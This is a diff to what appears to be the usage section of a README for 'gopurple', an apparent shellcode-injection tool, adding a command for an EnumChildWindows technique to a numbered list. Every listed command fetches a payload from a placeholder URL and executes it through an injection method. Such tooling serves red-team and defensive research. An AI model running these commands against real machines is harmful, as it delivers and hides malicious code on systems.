@@ -110,6 +110,8 @@ onlystore = only Microsoft store application's process can hook into the process
 13 - gopurple.exe -u urlhostingpayload -t 13 (BananaPhone)
 
 14-  gopurple.exe -u urlhostingpayload -t 14 (EnumerateLoadedModules)
+
+15-  gopurple.exe -u urlhostingpayload -t 15 (EnumChildWindows)
 ```
 
 
